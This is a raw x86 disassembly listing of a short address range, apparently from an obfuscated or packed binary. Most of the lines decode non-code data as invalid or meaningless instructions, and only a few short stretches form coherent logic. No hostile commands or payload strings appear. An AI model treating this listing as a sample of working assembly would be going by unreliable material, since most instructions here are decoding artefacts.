  40b325:	shl    DWORD PTR [ebp+eiz*2+0x36b7501],0xbd
  40b32d:	lods   eax,DWORD PTR ds:[esi]
  40b32e:	dec    eax
  40b32f:	dec    DWORD PTR [edx+0x5e3a2b51]
  40b335:	dec    esi
  40b337:	cli    
  40b338:	pop    ebx
  40b339:	inc    esi
  40b33a:	sub    DWORD PTR [edx-0x58],esp
  40b33d:	ins    BYTE PTR es:[edi],dx
  40b33e:	sbb    al,0x75
  40b340:	xor    dl,BYTE PTR [eax]
  40b342:	cld    
  40b343:	mov    ebp,0x2551c0fe
  40b348:	sub    al,0xe
  40b34a:	cli    
  40b34b:	arpl   WORD PTR [esi+0x5279a8b7],di
  40b351:	je     0x40b313
  40b353:	mov    ds:0xa2eed83d,al
  40b358:	(bad)  
  40b359:	sbb    al,0x1c
  40b35b:	lods   eax,DWORD PTR ds:[esi]
  40b35c:	dec    eax
  40b35d:	(bad)  
  40b35e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b35f:	std    
  40b360:	mov    ah,0x3b
  40b362:	fimul  DWORD PTR [edi]
  40b364:	xchg   DWORD PTR [eax],ecx
  40b366:	add    BYTE PTR [eax],al
  40b368:	add    BYTE PTR [ebx+0x36e9d055],cl
  40b36e:	pop    es
  40b36f:	add    BYTE PTR [eax],al
  40b371:	mov    edx,DWORD PTR [ebp-0x38]
  40b374:	mov    edi,DWORD PTR [ebp-0x4]
  40b377:	xor    edx,eax
  40b379:	xor    edi,eax
  40b37b:	add    edi,ecx
  40b37d:	add    edx,ecx
  40b37f:	imul   edx,edi
  40b382:	mov    edi,DWORD PTR [ebp-0x8]
  40b385:	mov    ebx,DWORD PTR [ebp-0x10]
  40b388:	sub    ebx,edi
  40b38a:	cmp    ebx,edx
  40b38c:	ja     0x40b39a
  40b392:	mov    edx,DWORD PTR [ebp-0x34]
  40b395:	jmp    0x40baa7
  40b39a:	mov    edx,DWORD PTR [ebp-0x3c]
  40b39d:	mov    edi,DWORD PTR [ebp-0x4]
  40b3a0:	jmp    0x40b713
  40b3a5:	ret    0x2e25
  40b3a8:	dec    ebx
  40b3a9:	icebp  
  40b3aa:	dec    ebx
  40b3ab:	ins    DWORD PTR es:[edi],dx
  40b3ac:	mov    ebp,0x68a70588
  40b3b1:	push   edi
  40b3b2:	loopne 0x40b3e8
  40b3b4:	pop    ebx
  40b3b5:	popa   
  40b3b6:	cli    
  40b3b7:	jl     0x40b435
  40b3b9:	retf   0x7c79
  40b3bc:	jl     0x40b3e8
  40b3be:	push   0xd0b2d4b
  40b3c3:	xor    eax,0x96757eb4
  40b3c8:	jge    0x40b36e
  40b3ca:	inc    ebx
  40b3cb:	jle    0x40b3b7
  40b3cd:	in     al,dx
  40b3ce:	inc    DWORD PTR [eax-0x4b]
  40b3d1:	pop    ecx
  40b3d2:	scas   eax,DWORD PTR es:[edi]
  40b3d3:	daa    
  40b3d4:	hlt    
  40b3d5:	ret    0xa61f
  40b3d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3d9:	xchg   edx,eax
  40b3da:	cmp    ah,BYTE PTR [esi-0x570aa897]
  40b3e0:	out    0x9e,eax
  40b3e2:	pop    ebp
  40b3e3:	mov    al,0x3b
  40b3e5:	adc    esi,DWORD PTR [edx+edi*8]
  40b3e8:	push   0x1f
  40b3ea:	or     eax,0x226e0b4d
  40b3ef:	and    BYTE PTR [ebp-0x58],dl
  40b3f2:	mov    ch,0xd8
  40b3f4:	pop    edx
  40b3f5:	aam    0x6b
  40b3f7:	lods   eax,DWORD PTR ds:[esi]
  40b3f8:	xor    BYTE PTR [ebp+0x74],bh
  40b3fb:	std    
  40b3fc:	int    0x90
  40b3fe:	fmul   DWORD PTR [ecx]
  40b400:	stos   DWORD PTR es:[edi],eax
  40b401:	add    al,0x28
  40b403:	loopne 0x40b3ad
  40b405:	cld    
  40b406:	or     al,0xca
  40b408:	lods   al,BYTE PTR ds:[esi]
  40b409:	mov    ebp,0x9ac99598
  40b40e:	std    
  40b40f:	scas   al,BYTE PTR es:[edi]
  40b410:	mov    gs,WORD PTR [edx-0x45]
  40b413:	sti    
  40b414:	rcl    DWORD PTR [ebx-0x7],0x9f
  40b418:	xabort 0xe1
  40b41b:	push   cs
  40b41c:	scas   al,BYTE PTR es:[edi]
  40b41d:	pop    es
  40b41e:	aaa    
  40b41f:	or     BYTE PTR [ebp-0x11],dl
  40b422:	mov    DWORD PTR [eax],esi
  40b424:	cmc    
  40b425:	mov    WORD PTR [ebp-0x68],es
  40b428:	fldcw  WORD PTR [esi+0x7424b79a]
  40b42e:	daa    
  40b42f:	icebp  
  40b430:	stos   DWORD PTR es:[edi],eax
  40b431:	jecxz  0x40b431
  40b433:	or     al,0x43
  40b435:	(bad)
  40b438:	add    edx,ecx
  40b43a:	cmp    BYTE PTR [ebx+0x1],0x7b
  40b43e:	rep lods eax,DWORD PTR ds:[esi]
  40b440:	mov    bh,0x52
  40b442:	jne    0x40b449
  40b444:	push   esp
  40b445:	dec    ecx
  40b446:	repz xchg esi,eax
  40b448:	sub    ah,BYTE PTR [edi-0x4a]
  40b44b:	xchg   DWORD PTR [ecx+edi*1],eax
  40b44e:	je     0x40b401
  40b450:	shl    BYTE PTR [ebp+0x33a3c9b4],1
  40b456:	test   BYTE PTR [ebp-0x6e7833cc],ah
  40b45c:	into   
  40b45d:	add    ebp,ebp
  40b45f:	test   BYTE PTR [edx-0x38],bl
  40b462:	xor    dh,dh
  40b464:	cs call 0xf9e3a78b
  40b46a:	aaa    
  40b46b:	test   al,0x3f
  40b46d:	jp     0x40b3fb
  40b46f:	aas    
  40b470:	pop    ebp
  40b471:	stc    
  40b472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b473:	pop    edx
  40b474:	jecxz  0x40b405
  40b476:	aad    0x6c
  40b478:	cmp    ah,BYTE PTR ds:0x7874bcec
  40b47e:	xor    eax,0xf6894eb8
  40b483:	cmp    DWORD PTR [edx+0x1c],ebx
  40b486:	cdq    
  40b487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b488:	xchg   ebx,eax
  40b489:	push   0xffffffce
  40b48b:	(bad)  
  40b48c:	scas   al,BYTE PTR es:[edi]
  40b48d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b48e:	or     DWORD PTR [eax-0x69d3615c],ecx
  40b494:	hlt    
  40b495:	gs ss xor al,0x67
  40b499:	dec    ebp
  40b49a:	dec    esp
  40b49b:	and    bl,BYTE PTR [edi-0x4d]
  40b49e:	mov    dl,0x3c
  40b4a0:	jo     0x40b441
  40b4a2:	xchg   edx,eax
  40b4a3:	xchg   edx,eax
  40b4a4:	ror    DWORD PTR [eax],1
  40b4a6:	in     al,dx
  40b4a7:	out    0x2,eax
  40b4a9:	and    BYTE PTR [eax+0x26],dh
  40b4ac:	ret    
  40b4ad:	pop    edx
  40b4ae:	(bad)  
  40b4af:	adc    bl,ch
  40b4b1:	sub    ax,0x833
  40b4b5:	retf   
  40b4b6:	shl    DWORD PTR es:[ecx+0x2d],cl
  40b4ba:	outs   dx,DWORD PTR ds:[esi]
  40b4bb:	mov    edi,0x5d5ffe26
  40b4c0:	add    eax,0x1025ddc3
  40b4c5:	dec    esp
  40b4c6:	sub    BYTE PTR [edi+0x8],dl
  40b4c9:	jb     0x40b487
  40b4cb:	gs cld 
  40b4cd:	sbb    BYTE PTR [ebx],ch
  40b4cf:	sbb    bh,BYTE PTR [edx]
  40b4d1:	adc    esi,DWORD PTR [ecx+0x3ed2ba5a]
  40b4d7:	aad    0xd7
  40b4d9:	lods   al,BYTE PTR ds:[esi]
  40b4da:	mov    cl,0x9c
  40b4dc:	mov    bl,0xd7
  40b4de:	fiadd  WORD PTR [esi+ebx*8-0x67]
  40b4e2:	stos   BYTE PTR es:[edi],al
  40b4e3:	xor    bl,BYTE PTR [ecx]
  40b4e5:	pop    ss
  40b4e6:	cmc    
  40b4e7:	sub    al,0x18
  40b4e9:	mov    ebp,0x333d9bf6
  40b4ee:	(bad)  
  40b4ef:	in     al,dx
  40b4f0:	jmp    0x3c912b76
  40b4f5:	push   eax
  40b4f6:	fldenv [edi]
  40b4f8:	inc    edi
  40b4f9:	repnz push edi
  40b4fb:	pop    ebp
  40b4fc:	sahf   
  40b4fd:	xlat   BYTE PTR ds:[ebx]
  40b4fe:	xor    eax,0x46e8286
  40b503:	dec    eax
  40b504:	fcmovnu st,st(4)
  40b506:	mov    ebp,ebp
  40b508:	lock vpcomw xmm11,xmm3,xmm0,0xce
  40b50f:	sbb    DWORD PTR [edi+ebx*2-0x64621004],eax
  40b516:	sub    ebp,DWORD PTR [eax]
  40b518:	pop    edx
  40b519:	push   ebx
  40b51a:	push   0x3a3747fd
  40b51f:	pop    esi
  40b520:	add    DWORD PTR [ecx-0x1f4982d3],0xcacc0b64
  40b52a:	and    al,0xc1
  40b52c:	pop    ds
  40b52d:	jns    0x40b56c
  40b52f:	out    0xfe,al
  40b531:	inc    ecx
  40b532:	jo     0x40b5a5
  40b534:	xor    BYTE PTR ds:0x82079937,dh
  40b53a:	outs   dx,DWORD PTR ds:[esi]
  40b53b:	test   al,0xb8
  40b53d:	ror    edi,0x1f
  40b540:	mov    dl,0x28
  40b542:	out    dx,eax
  40b543:	ret    0xa0d1
  40b546:	mov    DWORD PTR [ebp+0x76],ebp
  40b549:	jns    0x8f336f0e
  40b54f:	mov    ecx,0xcecad768
  40b554:	adc    bh,BYTE PTR ds:0x436f938e
  40b55a:	stos   DWORD PTR es:[edi],eax
  40b55b:	outs   dx,DWORD PTR ds:[esi]
  40b55c:	addr16 pusha 
  40b55e:	xchg   edi,eax
  40b55f:	sbb    DWORD PTR [eax+0x3bebcd98],ecx
  40b565:	jmp    0xbc5c:0x76183f1d
  40b56c:	jl     0x40b597
  40b56e:	jmp    0xe94f:0xc3962ab4
  40b575:	mov    ebx,0x677d8ce0
  40b57a:	lods   eax,DWORD PTR ds:[esi]
  40b57b:	and    ah,BYTE PTR [edi+0x3e199cd4]
  40b581:	add    BYTE PTR [esi-0x3ff15f8d],dl
  40b587:	ret    0x6bff
  40b58a:	loop   0x40b56e
  40b58c:	xor    edx,edx
  40b58e:	jle    0x40b551
  40b590:	and    eax,0xb85ee16b
  40b595:	mov    ds:0x59b76f82,al
  40b59a:	and    BYTE PTR [ecx+0x7e3d4af0],dl
  40b5a0:	dec    esp
  40b5a1:	lock ret 
  40b5a3:	imul   esp,DWORD PTR [edi-0x104208bf],0x2712275a
  40b5ad:	sar    dh,1
  40b5af:	pop    ecx
  40b5b0:	(bad)  
  40b5b1:	mov    ds:0x3ab16ff4,eax
  40b5b6:	arpl   cx,cx
  40b5b8:	pop    edx
  40b5b9:	xor    DWORD PTR [ebx-0x7e],esi
  40b5bc:	adc    BYTE PTR [eax+0x6b],al
  40b5bf:	lock xchg DWORD PTR [eax+0x74],ebp
  40b5c3:	push   es
  40b5c4:	xor    eax,0x9946c74d
  40b5c9:	sub    al,0x3e
  40b5cb:	or     DWORD PTR [ecx+0x62],esi
  40b5ce:	inc    edi
  40b5cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5d0:	cli    
  40b5d1:	mov    ebx,0xa1af94dc
  40b5d6:	inc    ecx
  40b5d7:	ss lahf 
  40b5d9:	pushf  
  40b5da:	xor    eax,0x76c2b9e9
  40b5df:	or     ah,BYTE PTR [esi+0x40]
  40b5e2:	ja     0x40b660
  40b5e4:	stos   BYTE PTR es:[edi],al
  40b5e5:	in     al,0xe8
  40b5e7:	ss sbb al,0x4d
  40b5ea:	cli    
  40b5eb:	xor    esi,ecx
  40b5ed:	push   eax
  40b5ee:	jns    0x40b5de
  40b5f0:	fsubrp st(7),st
  40b5f2:	push   0x3267878d
  40b5f7:	dec    edx
  40b5f8:	je     0x40b642
  40b5fa:	sub    DWORD PTR [eax-0x1f],esi
  40b5fd:	call   0xdd3e:0xf3b0faa9
  40b604:	mov    al,0xa1
  40b606:	add    DWORD PTR [ebx-0x5621b985],eax
  40b60c:	add    al,0x41
  40b60e:	lea    ebx,ds:0xb285b268
  40b614:	jmp    0x8379ff61
  40b619:	int3   
  40b61a:	(bad)  
  40b61b:	xchg   esp,eax
  40b61c:	dec    edx
  40b61d:	call   0x8a67:0x8e78b303
  40b624:	cmp    DWORD PTR [eax+0x37fbd2da],0x57b07e43
  40b62e:	hlt    
  40b62f:	jno    0x40b5f1
  40b631:	dec    ebp
  40b632:	dec    esp
  40b633:	mov    ch,BYTE PTR [ebx+0x34]
  40b636:	shr    BYTE PTR [ebx-0x56d9e2da],1
  40b63c:	jmp    0xf1bf:0x5193b5a8
  40b643:	pop    ds
  40b644:	cwde   
  40b645:	push   esp
  40b646:	sub    dh,ah
  40b648:	test   eax,0xb07a967d
  40b64d:	leave  
  40b64e:	ja     0x40b63f
  40b650:	popa   
  40b651:	fiadd  WORD PTR [eax-0x44]
  40b654:	ins    BYTE PTR es:[edi],dx
  40b655:	and    al,0x58
  40b657:	cmp    BYTE PTR [eax-0x23948fbc],ah
  40b65d:	ror    edi,1
  40b65f:	adc    BYTE PTR [ebp+0x56],ch
  40b662:	in     al,dx
  40b663:	xchg   BYTE PTR [ebp-0x26],cl
  40b666:	or     esp,ecx
  40b668:	lods   al,BYTE PTR ds:[esi]
  40b669:	imul   edx,esi,0xdab9a0c0
  40b66f:	(bad)  
  40b670:	in     al,0x86
  40b672:	xor    BYTE PTR [eax+0x2da5055e],dl
  40b678:	push   eax
  40b679:	(bad)  
  40b67a:	mov    ebp,0xf0ff4369
  40b67f:	cwde   
  40b680:	cs mov esi,0xf736793b
  40b686:	repz fs jle 0x40b60c
  40b68a:	or     dl,BYTE PTR [ebp-0x27]
  40b68d:	stos   BYTE PTR es:[edi],al
  40b68e:	es ret 0xc3b4
  40b692:	fs jg  0x40b694
  40b695:	out    dx,al
  40b696:	push   esp
  40b697:	sub    dh,BYTE PTR [ebx-0x21]
  40b69a:	and    bl,BYTE PTR [esi+0x13]
  40b69d:	or     eax,edi
  40b69f:	lock (bad) 
  40b6a2:	push   ds
  40b6a3:	fcomp  QWORD PTR [esi-0x17]
  40b6a6:	ins    DWORD PTR es:[edi],dx
  40b6a7:	or     edx,0x23275e00
  40b6ad:	fld    QWORD PTR [ebx]
  40b6af:	push   eax
  40b6b0:	jl     0x40b682
  40b6b2:	or     DWORD PTR [eax+0x11238f39],edi
  40b6b8:	out    dx,eax
  40b6b9:	sbb    DWORD PTR [esi+edx*8-0xd],edi
  40b6bd:	lock pusha 
  40b6bf:	aas    
  40b6c0:	jae    0x40b682
  40b6c2:	xor    DWORD PTR [edi],ebx
  40b6c4:	push   edi
  40b6c5:	inc    ebx
  40b6c6:	jae    0x40b6ff
  40b6c8:	inc    eax
  40b6c9:	jl     0x40b709
  40b6cb:	jle    0x40b69a
  40b6cd:	xor    al,0xa4
  40b6cf:	lods   al,BYTE PTR ds:[esi]
  40b6d0:	das    
  40b6d1:	icebp  
  40b6d2:	xor    al,0x3b
  40b6d4:	xchg   esi,eax
  40b6d5:	cmp    eax,0x343a80e
  40b6da:	xchg   esp,eax
  40b6db:	sbb    BYTE PTR [edx-0x2b50c0d3],cl
  40b6e1:	sub    eax,0x2a5c5f69
  40b6e6:	jge    0x40b6c5
  40b6e8:	push   ds
  40b6e9:	in     al,0x6f
  40b6eb:	jo     0x40b718
  40b6ed:	xchg   edx,eax
  40b6ee:	pop    edi
  40b6ef:	ror    BYTE PTR [edx+0x5d],0xef
  40b6f3:	mov    fs,WORD PTR [ecx-0x1e]
  40b6f6:	fadd   QWORD PTR [eax-0x32]
  40b6f9:	and    DWORD PTR [esi+eax*8-0x3],0xffffffac
  40b6fe:	loope  0x40b77a
  40b700:	(bad)  
  40b701:	push   esi
  40b702:	push   0x27b5a395
  40b707:	jge    0x40b74b
  40b709:	call   0x5862b14d
  40b70e:	loope  0x40b77b
  40b710:	xor    al,0x28
  40b712:	(bad)  
  40b713:	xor    edx,eax
  40b715:	xor    edi,eax
  40b717:	add    edx,ecx
  40b719:	add    edi,ecx
  40b71b:	imul   edx,edi
  40b71e:	mov    edi,DWORD PTR [ebp-0x8]
  40b721:	mov    ebx,DWORD PTR [ebp-0x10]
  40b724:	sub    ebx,edi
  40b726:	cmp    ebx,edx
  40b728:	mov    edx,DWORD PTR [ebp-0x38]
  40b72b:	jbe    0x40baa7
  40b731:	jmp    0x40baa4
  40b736:	dec    ecx
  40b737:	mov    cl,0xec
  40b739:	cwde   
  40b73a:	hlt    
  40b73b:	ins    DWORD PTR es:[edi],dx
  40b73c:	push   ebp
  40b73d:	jge    0x40b6d6
  40b73f:	loop   0x40b70e
  40b741:	loope  0x40b6d8
  40b743:	dec    ecx
  40b744:	int    0xe8
  40b746:	aas    
  40b747:	xchg   BYTE PTR [esp+edi*2-0x36],bh
  40b74b:	jns    0x40b7c9
  40b74d:	jl     0x40b6e2
  40b74f:	and    DWORD PTR [ecx+0x6d],edi
  40b752:	pop    edx
  40b753:	dec    ecx
  40b754:	xchg   edx,eax
  40b755:	sub    eax,0xe690ee7c
  40b75a:	pusha  
  40b75b:	add    ch,BYTE PTR [ebx-0x22]
  40b75e:	sbb    eax,0xe2cf1de4
  40b763:	push   edi
  40b764:	inc    edi
  40b765:	ret    
  40b766:	push   eax
  40b767:	push   edi
  40b768:	lock scas al,BYTE PTR es:[edi]
  40b76a:	jl     0x40b713
  40b76c:	(bad)  [ebx-0x11e8090a]
  40b772:	les    edx,FWORD PTR [edx+0x37]
  40b775:	dec    esp
  40b776:	lds    eax,FWORD PTR [esi*2-0x33fc208c]
  40b77d:	jg     0x40b7f6
  40b77f:	or     BYTE PTR [esp+eiz*8],0xdf
  40b783:	mov    edx,DWORD PTR [esi]
  40b785:	and    eax,0xb90f9dbf
  40b78a:	stos   BYTE PTR es:[edi],al
  40b78b:	cmp    eax,0x44670ddd
  40b790:	dec    edx
  40b791:	loopne 0x40b72d
  40b793:	stos   BYTE PTR es:[edi],al
  40b794:	(bad)
  40b797:	mov    al,0xc1
  40b799:	and    al,0x3a
  40b79b:	js     0x40b7d9
  40b79d:	daa    
  40b79e:	sbb    al,0x87
  40b7a0:	pop    ds
  40b7a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7a2:	mov    ds:0xf73b1c0b,al
  40b7a7:	setns  BYTE PTR [esi+0x17]
  40b7ab:	push   ebx
  40b7ac:	and    BYTE PTR [edi+0xe],cl
  40b7af:	inc    ebp
  40b7b0:	jmp    0x1b768b77
  40b7b5:	lods   al,BYTE PTR ds:[esi]
  40b7b6:	or     DWORD PTR [edx-0x11],0x7
  40b7ba:	jge    0x40b786
  40b7bc:	inc    esp
  40b7bd:	pop    ecx
  40b7be:	dec    ebp
  40b7bf:	cli    
  40b7c0:	pop    ecx
  40b7c1:	pop    ebp
  40b7c2:	inc    ebp
  40b7c3:	mov    WORD PTR [ecx+0x66fd746d],fs
  40b7c9:	in     eax,0x88
  40b7cb:	jae    0x40b76d
  40b7cd:	je     0x40b7f3
  40b7cf:	dec    esi
  40b7d0:	xor    BYTE PTR [ecx],ah
  40b7d2:	loop   0x40b795
  40b7d4:	xor    edi,DWORD PTR [ecx-0x4b20adf8]
  40b7da:	test   bh,0x86
  40b7dd:	aas    
  40b7de:	sbb    cl,ch
  40b7e0:	call   0xd63364de
  40b7e5:	mov    edi,0x7ef8586e
  40b7ea:	stos   BYTE PTR es:[edi],al
  40b7eb:	sbb    eax,0x4ef6975
  40b7f0:	or     DWORD PTR [bp+0x40],0x5a907efd
  40b7f8:	pop    ecx
  40b7f9:	mov    ds:0xe2eaec67,eax
  40b7fe:	in     eax,0x3e
  40b800:	in     al,dx
  40b801:	in     eax,0x83
  40b803:	lea    ebp,[esp+esi*2]
  40b806:	iret   
  40b807:	dec    esi
  40b808:	cmp    al,BYTE PTR [ebx-0x2b]
  40b80b:	int    0x21
  40b80d:	xor    cl,dl
  40b80f:	and    al,BYTE PTR [eax+0xcc24726]
  40b815:	mov    esp,0x2b254baa
  40b81a:	call   0x8315:0x576d5303
  40b821:	outs   dx,BYTE PTR ds:[esi]
  40b822:	out    dx,eax
  40b823:	adc    DWORD PTR [esi+0x3843c7f2],ecx
  40b829:	sub    cl,al
  40b82b:	int3   
  40b82c:	test   ch,bl
  40b82e:	dec    esp
  40b82f:	add    esi,DWORD PTR [eax+ecx*1]
  40b832:	popf   
  40b833:	mov    ebp,0xc7511a09
  40b838:	xchg   DWORD PTR [eax+eax*8+0x11],edi
  40b83c:	sub    ah,dl
  40b83e:	repnz clc 
  40b840:	lods   eax,DWORD PTR ds:[esi]
  40b841:	or     eax,0x223dde73
  40b846:	adc    eax,0x356aaeee
  40b84b:	cwde   
  40b84c:	pusha  
  40b84d:	ret    0x41b0
  40b850:	xor    DWORD PTR [edi+0x5381153f],0x6e
  40b857:	pop    ds
  40b858:	xchg   edi,eax
  40b859:	loope  0x40b887
  40b85b:	ja     0x40b895
  40b85d:	(bad)  
  40b85e:	push   ds
  40b85f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b860:	cmp    al,0x54
  40b862:	jno    0x40b818
  40b864:	fisubr WORD PTR ds:0x7e124fc5
  40b86a:	fisub  DWORD PTR [ebp-0x4e]
  40b86d:	and    DWORD PTR [esi+ebx*8+0x53],ebx
  40b871:	lods   al,BYTE PTR ds:[esi]
  40b872:	pop    eax
  40b873:	dec    cl
  40b875:	or     ecx,DWORD PTR [eax-0x4059ff41]
  40b87b:	or     edx,ebp
  40b87d:	jnp    0x40b829
  40b87f:	sub    ah,BYTE PTR [ebx+eax*2+0x9247ffa]
  40b886:	adc    dh,dh
  40b888:	push   ds
  40b889:	pop    ebx
  40b88a:	mov    cl,0x95
  40b88c:	jecxz  0x40b846
  40b88e:	xchg   edi,eax
  40b88f:	sub    dh,bh
  40b891:	stos   DWORD PTR es:[edi],eax
  40b892:	mov    ds:0x8681326,al
  40b897:	add    al,0x5d
  40b899:	or     al,dl
  40b89b:	sub    esp,DWORD PTR [edi-0x1e]
  40b89e:	mov    ah,0x2b
  40b8a0:	mov    ebx,0xec2a9480
  40b8a5:	adc    eax,0x53744ae1
  40b8aa:	data16 jle 0x40b86d
  40b8ad:	and    BYTE PTR [edi+ebp*1-0x12],0x96
  40b8b2:	fucom  st(4)
  40b8b4:	mov    esp,0x2e46b31d
  40b8b9:	out    0xab,al
  40b8bb:	shr    DWORD PTR [esi+0x63a96a64],cl
  40b8c1:	addr16 leave 
  40b8c3:	divps  xmm2,XMMWORD PTR [ecx+0x2f08d72c]
  40b8ca:	leave  
  40b8cb:	add    eax,0x36a0c94f
  40b8d0:	xor    eax,0x7454adbd
  40b8d5:	cwde   
  40b8d6:	jb     0x40b879
  40b8d8:	(bad)  
  40b8d9:	push   0xbdb2139
  40b8de:	push   edi
  40b8df:	sbb    eax,0xb6180633
  40b8e4:	lahf   
  40b8e5:	pop    edx
  40b8e6:	aam    0xd6
  40b8e8:	xor    BYTE PTR [ecx+0xd],dl
  40b8eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8ec:	jno    0x40b8cc
  40b8ee:	idiv   BYTE PTR [eax+0x1f]
  40b8f1:	(bad)  
  40b8f3:	xor    al,0x25
  40b8f5:	cmp    ch,BYTE PTR es:[ecx-0x1d1c4473]
  40b8fc:	in     al,0x76
  40b8fe:	pop    ds
  40b8ff:	mov    eax,0x62c3675b
  40b904:	or     BYTE PTR [ecx+0x71356f49],cl
  40b90a:	xchg   BYTE PTR [ecx+esi*2+0x6bad977],dh
  40b911:	mov    ch,0x7d
  40b913:	jne    0x40b8e2
  40b915:	jb     0x40b945
  40b917:	lahf   
  40b918:	outs   dx,BYTE PTR ds:[esi]
  40b919:	adc    esi,0x6d
  40b91c:	sub    edi,DWORD PTR [ebp+0x603be938]
  40b922:	add    ah,BYTE PTR [esi]
  40b924:	inc    esi
  40b925:	or     al,0x9c
  40b927:	dec    ebx
  40b928:	and    al,0x0
  40b92a:	jle    0x40b8e5
  40b92c:	jae    0x40b9aa
  40b92e:	je     0x40b8de
  40b930:	cli    
  40b931:	sbb    eax,0x582987b4
  40b936:	pop    ebx
  40b937:	test   al,0xcc
  40b939:	out    dx,al
  40b93a:	aaa    
  40b93b:	sbb    eax,0x8b63bfb4
  40b940:	mov    eax,0x7c51d0ed
  40b945:	lock push eax
  40b947:	neg    dl
  40b949:	fadd   DWORD PTR [bx-0x1991]
  40b94e:	clc    
  40b94f:	dec    esp
  40b950:	or     ch,dh
  40b952:	xor    ah,BYTE PTR [edi]
  40b954:	mov    BYTE PTR [eax-0x7ad7cb2e],dh
  40b95a:	std    
  40b95b:	stos   BYTE PTR es:[edi],al
  40b95c:	aad    0x13
  40b95e:	mov    ecx,esi
  40b960:	stc    
  40b961:	es adc al,0x59
  40b964:	ss stos DWORD PTR es:[edi],eax
  40b966:	out    dx,eax
  40b967:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b968:	hlt    
  40b969:	pop    edx
  40b96a:	mov    edi,0x7e109cf7
  40b96f:	(bad)  
  40b970:	(bad)  
  40b971:	or     DWORD PTR [edi],edx
  40b973:	mov    ah,0x64
  40b975:	cmp    al,0xe6
  40b977:	jecxz  0x40b9cd
  40b979:	add    DWORD PTR [esi-0x1e],eax
  40b97c:	mov    al,0x94
  40b97e:	popa   
  40b97f:	pop    es
  40b980:	jb     0x40ba01
  40b982:	xor    esi,DWORD PTR [edx-0x43008929]
  40b988:	bound  ecx,QWORD PTR [edi-0x651b7614]
  40b98e:	div    BYTE PTR ds:0x35e3ea20
  40b994:	pop    ss
  40b995:	es out dx,eax
  40b997:	push   0x4f
  40b999:	xor    eax,0x72c3ca54
  40b99e:	leave  
  40b99f:	inc    esi
  40b9a0:	aad    0x4e
  40b9a2:	inc    edx
  40b9a3:	push   edi
  40b9a4:	aad    0xd7
  40b9a6:	or     DWORD PTR [eax],eax
  40b9a8:	mov    esi,0x692571c9
  40b9ad:	lahf   
  40b9ae:	xchg   BYTE PTR [eax*1+0x4b4283d7],cl
  40b9b5:	clc    
  40b9b6:	iret   
  40b9b7:	in     al,0x7b
  40b9b9:	mov    ebx,0xa787e202
  40b9be:	pop    esp
  40b9bf:	lods   al,BYTE PTR ds:[esi]
  40b9c0:	or     edi,edi
  40b9c2:	iret   
  40b9c3:	lock adc DWORD PTR [ebp-0x5545c46e],esi
  40b9ca:	in     eax,dx
  40b9cb:	mov    ebp,0xce5ca9af
  40b9d0:	xchg   ch,al
  40b9d2:	addr16 std 
  40b9d4:	outs   dx,DWORD PTR ds:[esi]
  40b9d5:	push   edx
  40b9d6:	adc    edx,DWORD PTR [esi+0x22]
  40b9d9:	ins    BYTE PTR es:[edi],dx
  40b9da:	or     al,0x2e
  40b9dc:	scas   al,BYTE PTR es:[edi]
  40b9dd:	gs xor eax,0x43b948cb
  40b9e3:	imul   ebx,DWORD PTR [ebp-0x7f],0x3
  40b9e7:	outs   dx,BYTE PTR ds:[esi]
  40b9e8:	and    al,BYTE PTR fs:[edx+0x1e]
  40b9ec:	enter  0x21b3,0x5f
  40b9f0:	xchg   DWORD PTR [ebx+esi*8+0x3a],edi
  40b9f4:	push   0x5221aea7
  40b9f9:	adc    eax,0x1f4963d5
  40b9fe:	mov    BYTE PTR [ecx-0x80],ah
  40ba01:	inc    ebx
  40ba02:	inc    edx
  40ba03:	add    bh,0x2e
  40ba06:	jno    0x40ba2f
  40ba08:	sub    al,0x28
  40ba0a:	inc    ecx
  40ba0b:	(bad)  
  40ba0c:	fadd   DWORD PTR ds:0xc6ee877d
  40ba12:	push   ebp
  40ba13:	jo     0x40ba45
  40ba15:	sbb    edi,esi
  40ba17:	inc    ecx
  40ba18:	std    
  40ba19:	repz xchg esp,eax
  40ba1b:	retf   0x11af
  40ba1e:	adc    eax,0x231cee5c
  40ba23:	jp     0x40ba7b
  40ba25:	mov    ebx,gs
  40ba27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba28:	add    DWORD PTR [ecx+0x48],esp
  40ba2b:	inc    edi
  40ba2c:	loop   0x40ba68
  40ba2e:	mov    eax,0x5c6e10b1
  40ba33:	pop    edx
  40ba34:	aam    0xb
  40ba36:	cmp    BYTE PTR [edx-0x1aa3a4c1],ch
  40ba3c:	in     eax,dx
  40ba3d:	(bad)  
  40ba3e:	push   ds
  40ba3f:	jno    0x40ba02
  40ba41:	jno    0x40ba94
  40ba43:	add    DWORD PTR [eax],ebx
  40ba45:	mov    ecx,0xa79c1069
  40ba4a:	adc    esi,DWORD PTR [ecx]
  40ba4c:	pusha  
  40ba4d:	fnsave [ebx]
  40ba4f:	mov    bl,0x1
  40ba51:	mov    dh,0x62
  40ba53:	mov    BYTE PTR [esi],bh
  40ba55:	mov    BYTE PTR [eax+0xae8924],ch
  40ba5b:	shl    BYTE PTR [edx-0x54a3a9b8],cl
  40ba61:	jle    0x40bab1
  40ba63:	out    0x6c,eax
  40ba65:	sbb    BYTE PTR [edx-0x44],al
  40ba68:	into   
  40ba69:	dec    edi
  40ba6a:	out    dx,al
  40ba6b:	inc    ecx
  40ba6c:	pop    eax
  40ba6d:	outs   dx,DWORD PTR gs:[esi]
  40ba6f:	ja     0x40ba61
  40ba71:	xchg   ebx,eax
  40ba72:	sbb    al,0x13
  40ba74:	icebp  
  40ba75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba76:	repnz lahf 
  40ba78:	xchg   ebp,eax
  40ba79:	push   ebp
  40ba7a:	and    al,0x3
  40ba7c:	xor    eax,0x75
  40ba7f:	jo     0x40bacb
  40ba81:	add    BYTE PTR [edi],ch
  40ba83:	gs nop
  40ba85:	into   
  40ba86:	sbb    al,ch
